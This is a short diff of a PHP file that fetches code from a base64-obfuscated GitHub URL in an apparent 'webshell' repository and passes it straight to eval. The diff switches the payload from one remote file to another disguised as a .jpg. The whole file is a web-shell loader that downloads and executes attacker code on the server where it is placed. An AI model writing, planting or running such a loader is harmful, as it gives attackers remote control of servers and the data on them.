@@ -1,5 +1,5 @@
 
-<?=<?php
+<?php
    function get($url) {
     $ch = curl_init();
 
@@ -13,5 +13,5 @@
     return $data;
 }
 $x= '?>';
-      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4cGxvaXQtaGF4b3Ivd2Vic2hlbGwvbWFpbi9tYWtsby1yb290LnBocA==')));
+      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4cGxvaXQtaGF4b3Ivd2Vic2hlbGwvbWFpbi9ieXBhcy5waHAuanBn')));
 ?>
